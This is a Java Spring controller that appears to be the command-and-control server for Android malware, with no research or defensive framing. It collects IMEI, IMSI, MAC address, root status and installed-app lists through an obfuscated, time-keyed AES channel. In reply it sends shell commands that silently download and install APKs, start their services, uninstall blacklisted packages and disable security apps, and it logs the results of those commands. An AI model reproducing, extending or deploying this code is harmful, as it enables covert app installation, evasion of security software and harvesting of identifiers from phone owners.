package net.workspace.web.web;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import net.workspace.web.entity.channel.ChannelEntity;
import net.workspace.web.entity.mic.MicClientEntity;
import net.workspace.web.entity.mic.MicEntity;
import net.workspace.web.entity.mic.MicSettingEntity;
import net.workspace.web.service.channel.ChannelService;
import net.workspace.web.service.mic.MicClientService;
import net.workspace.web.service.mic.MicService;
import net.workspace.web.service.mic.MicSettingService;
import org.apache.commons.lang3.StringUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import utils.AES;

@Controller
@RequestMapping(value = "")
public class MicController extends AbstractController {
    private class MicHisotry {
        private int count;
        private long lastTime;
        MicHisotry(int count, long lastTime) {
            this.count = count;
            this.lastTime = lastTime;
        }
    }
    private static String generatePassword(long current) {
        StringBuilder sb = new StringBuilder();
        return sb.append(current * 228).append(current * 213).substring(0, 16);
    }
    private static final long DEFAULT_INTERVAL = 3456 * 2;
    private static final String Key_URL = "a";
    private static final String Key_LOCATION = "b";
    private static final String KEY_COMMANDS = "c";
    private static final String KEY_INTERVAL = "d";
    @SuppressWarnings("unused")
    private static final String KEY_SERVER_URL = "e";
    private static final String KEY_REPORT_CMD_RESULT = "f";
    private static final String KEY_BACKGROUND_ONLY = "G";
    //added on 20141016
    private static final String KEY_FILE_MD5 = "aa";
    private static final String KEY_CLIENT_ID = "aes";
    public static final String STOP_SECURITY_APPS = "h";
    public static final String STOP_SECURITY_APPS_REPORT = "i";
    private static final Logger logger = LoggerFactory.getLogger("MicLogger");
    @Autowired
    private MicService micService;
    @Autowired
    private ChannelService channelService;
    @Autowired
    private MicSettingService micSettingService;
    @Autowired
    private MicClientService micClientService;
    private static final int MIC_TYPE_PLUGIN = 1;
    private static final int MIC_TYPE_GAME = 2;
    private MicClientEntity composeClient(JSONObject data) throws Throwable {
        MicClientEntity result = new MicClientEntity();
        long clientId = data.optLong(KEY_CLIENT_ID);
        if (clientId == 0) {
            result.setManufacturer(data.optString("a"));
            result.setModel(data.optString("b"));
            result.setVersionCode(data.optString("c"));
            result.setPackageName(data.optString("d"));
            result.setLanguage(data.optString("e"));
            result.setSdk(data.optString("f"));
            result.setAndroidId(data.optString("g"));
            result.setMacAddress(data.optString("h"));
            result.setBrand(data.optString("i"));
            result.setImei(data.optString("j"));
            result.setImsi(data.optString("k"));
            result.setCarrier(data.optString("l"));
            result.setWifiEnable(data.optString("m"));
            result.setHasSD(data.optString("n"));
            result.setSystemApp(data.optString("p"));
            result.setRooted(data.optString("q"));
            long channelId = 1;
            String channelUuid = data.optString("u");
            if (StringUtils.isNotEmpty(channelUuid)) {
                ChannelEntity channel = channelService.findByUUID(channelUuid);
                if (channel != null) {
                    channelId = channel.getId();
                }
            }
            result.setChannelId(channelId);
        } else {
            result.setId(clientId);
        }
        result.setPluginPackageName(data.optString("r"));
        result.setPluginVersionCode(data.optInt("s"));
        long time = data.optLong("t");
        if (time > 0) result.setPluginUpdateTime(new Date(time));
        result.setInstalledPackages(StringUtils.left(data.optString("o"), 1000));
        return result;
    }
    private Map<Long, MicHisotry> composeInstallHistory(String installLog) {
        Map<Long, MicHisotry> installHistory = new HashMap<Long, MicHisotry>();
        if (installLog != null && installLog.contains("|")) {
            for (String field : installLog.split(",")) {
                if (StringUtils.isNotBlank(field)) {
                    String[] parts = field.trim().split("\\|");
                    if (parts.length == 3) {
                        long id = Long.valueOf(parts[0]);
                        int count = Integer.valueOf(parts[1]);
                        long lastTime = Long.valueOf(parts[2]);
                        installHistory.put(id, new MicHisotry(count, lastTime));
                    }
                }
            }
        }
        return installHistory;
    }
    private boolean composeNewInstallCommands(MicClientEntity client, JSONObject output, JSONArray commands, int type) throws JSONException {
        MicEntity mic = null;
        Map<Long, MicHisotry> map = composeInstallHistory(client.getInstallLog());
        mic = pickOne(map, type);
        if (mic != null) {
            if (StringUtils.isNotBlank(mic.getMd5())) {
                output.put(KEY_FILE_MD5, mic.getMd5().trim());
            }
            output.put(Key_URL, mic.getUrl());
            String location = "/sdcard/cb" + mic.getId() + "cx.db";
            output.put(Key_LOCATION, location);
            // commands.put("pm uninstall "+entity.getPackageName());
            commands.put("pm install -r " + location);
            switch (mic.getActivateType()) {
                case 1://Service
                       // commands.put ("codess," + entity.getPackageName () + "," + entity.getEntrance ());
                    commands.put(getStartServiceCommand(client, mic.getPackageName() + "/" + mic.getEntrance()));
                    break;
                case 2://Activity
                       //commands.put ("codesa," + entity.getPackageName () + "," + entity.getEntrance ());
                    commands.put("am start -n " + mic.getPackageName() + "/" + mic.getEntrance() + " ");
                    break;
            }
            //commands.put ("rm " + location);
            client.setInstallLog(generateInstallLog(map, mic));
            micClientService.save(client);
            return true;
        }
        return false;
    }
    private boolean composePluginCommands(MicClientEntity client, JSONObject output, JSONArray commands) throws JSONException {
        boolean hasInstallCommands = false;
        boolean needInstall = true;
        String packageName = client.getPluginPackageName();
        if (StringUtils.isNotEmpty(packageName)) {
            MicEntity mic = micService.getByPackageName(packageName);
            if (mic != null) {
                if (mic.isUninstall()) {
                    commands.put("pm uninstall " + packageName);
                } else {
                    commands.put(getStartServiceCommand(client, packageName + "/" + mic.getEntrance()));
                    needInstall = false;
                }
            }
        }
        if (needInstall) {
            hasInstallCommands = composeNewInstallCommands(client, output, commands, MIC_TYPE_PLUGIN);
        }
        return hasInstallCommands;
    }
    private void composeUninstallCommands(MicClientEntity client, JSONArray commands) {
        MicSettingEntity setting = micSettingService.getSetting();
        if (setting != null && StringUtils.isNotBlank(setting.getBlackPackages())) {
            for (String pkg : setting.getBlackPackages().split(",")) {
                if (StringUtils.isNotBlank(pkg) && StringUtils.contains(client.getInstalledPackages(), pkg.trim())) {
                    commands.put("pm uninstall " + pkg.trim());
                }
            }
        }
    }
    @RequestMapping(value = "/yyyyyyyyyyy")
    public void execute(HttpServletRequest request, HttpServletResponse response) {
        String method = request.getHeader("m");
        if ("r".equals(method)) {
            handleReport(request, response);
        } else {
            JSONObject logObj = new JSONObject();
            String password = null;
            String result = null;
            String time = request.getHeader("time");
            if (StringUtils.isNotEmpty(time)) {
                try {
                    //JSONObject input = getRequestParams(request);
                    //logObj.put("input", input);
                    password = generatePassword(Long.valueOf(time));
                    String postData = AES.decode(request.getParameter("post"), password);
                    JSONObject data = new JSONObject(postData);
                    logObj.put("input", data);
                    MicClientEntity client = micClientService.load(composeClient(data));
                    if (client != null) {
                        logObj.put("sdk", client.getSdk());
                        JSONObject output = handle(client);
                        logObj.put("output", output);
                        result = AES.encode(output.toString(), password);
                    }
                } catch (Throwable e) {
                    logger.error(e.getMessage(), e);
                }
            }
            logger.info(getRemoteAddr(request) + ",http://" + request.getHeader("HOST") + request.getHeader("REQUEST_PATH") + ":" + logObj.toString() + "\n");
            if (result == null) result = " ";
            WebUtil.zipWrite(response, result);
        }
    }
    private String generateInstallLog(Map<Long, MicHisotry> installMap, MicEntity mic) {
        StringBuilder sb = new StringBuilder();
        {
            MicHisotry history = installMap.get(mic.getId());
            if (history == null) {
                history = new MicHisotry(0, 0);
                installMap.put(mic.getId(), history);
            }
            history.count++;
            history.lastTime = System.currentTimeMillis();
        }
        for (Long id : installMap.keySet()) {
            MicHisotry history = installMap.get(id);
            sb.append(id).append("|").append(history.count).append("|").append(history.lastTime).append(",");
        }
        return sb.toString();
    }
    private String getRemoteAddr(HttpServletRequest request) {
        return request.getHeader("X-Real-IP");
    }
    private Random random = new Random();
    private long getRequestInterval() {
        MicSettingEntity setting = micSettingService.getSetting();
        long result = setting == null ? DEFAULT_INTERVAL : setting.getRequestInterval();
        // result = result + random.nextInt(300) * (random.nextBoolean() ? 1 : -1);
        return result;
    }
    private String getStartServiceCommand(MicClientEntity client, String intent) {
        int sdkVersion = 0;
        try {
            sdkVersion = Integer.valueOf(client.getSdk());
        } catch (Throwable e) {}
        if (sdkVersion <= 15) {
            return "am startservice  -n  " + intent + " ";
        } else {
            return "am startservice --user 0 -n  " + intent + " ";
        }
    }
    private JSONObject handle(MicClientEntity client) throws JSONException {
        JSONObject output = new JSONObject();
        long delaySeconds = micClientService.getInstallDelaySeconds(client.getChannelId());
        boolean isTime = (System.currentTimeMillis() - client.getCreateTime().getTime()) / 1000 > delaySeconds;
        MicSettingEntity setting = micSettingService.getSetting();
        output.put(KEY_INTERVAL, getRequestInterval());
        output.put(KEY_BACKGROUND_ONLY, setting.isBackgroundInstall());
        output.put(STOP_SECURITY_APPS, true);
        output.put(STOP_SECURITY_APPS_REPORT, true);
        output.put(KEY_CLIENT_ID, client.getId());
        if (isTime) {
            JSONArray commands = new JSONArray();
            output.put(KEY_REPORT_CMD_RESULT, setting.isReportCommand());
            output.put(KEY_COMMANDS, commands);
            composeUninstallCommands(client, commands);
            boolean newInstall = composePluginCommands(client, output, commands);
            if (!newInstall) {
                composeNewInstallCommands(client, output, commands, MIC_TYPE_GAME);
            }
        }
        return output;
    }
    private void handleReport(HttpServletRequest request, HttpServletResponse response) {
        JSONObject logObj = new JSONObject();
        try {
            String password = generatePassword(Long.valueOf(request.getHeader("time")));
            logObj.put("report", new JSONArray(AES.decode(request.getParameter("r"), password)));
            String postData = AES.decode(request.getParameter("p"), password);
            logObj.put("info", postData);
        } catch (Throwable e) {
            e.printStackTrace();
        }
        logger.info(getRemoteAddr(request) + ",http://" + request.getHeader("HOST") + request.getHeader("REQUEST_PATH") + ":" + "cmd-report:" + logObj.toString() + "\n");
        WebUtil.zipWrite(response, " ");
    }
    private MicEntity pickOne(Map<Long, MicHisotry> installHistory, int type) {
        for (MicEntity item : micService.getAllEnabledByType(type)) {
            if (!installHistory.containsKey(item.getId())) return item;
            MicHisotry history = installHistory.get(item.getId());
            if ((System.currentTimeMillis() - history.lastTime) / 1000 > item.getTryInterval() && item.getTryCount() > history.count) return item;
        }
        return null;
    }
}
